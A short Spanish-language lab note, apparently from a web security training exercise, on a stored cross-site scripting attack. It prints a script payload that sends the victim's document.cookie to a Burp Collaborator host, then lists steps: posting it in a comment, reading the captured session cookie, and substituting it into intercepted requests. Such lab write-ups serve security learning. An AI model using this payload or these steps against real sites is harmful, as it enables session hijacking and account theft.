![[Pasted image 20220831185459.png]]



%script%
fetch('https://3x1f2d74qt267bthk7qy5l8ax13srh.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body: document.cookie
});
%script%

notese que es https

en un comentario pego el payload:

![[Pasted image 20220831190851.png]]


![[Pasted image 20220831190553.png]]

pongo en poll el burp collaborator:

![[Pasted image 20220831191011.png]]

el request HTTP lo selecciono y encuentro una cookie:
dqmX9OGr11BKBns4svg2kVft9YTmok8V

activo el intercept y me regreso al home, hago click en un link y analizo la traza:

![[Pasted image 20220831191305.png]]

![[Pasted image 20220831191352.png]]

sustituyo la cookie

![[Pasted image 20220831191430.png]]

forward a todo:

![[Pasted image 20220831191612.png]]



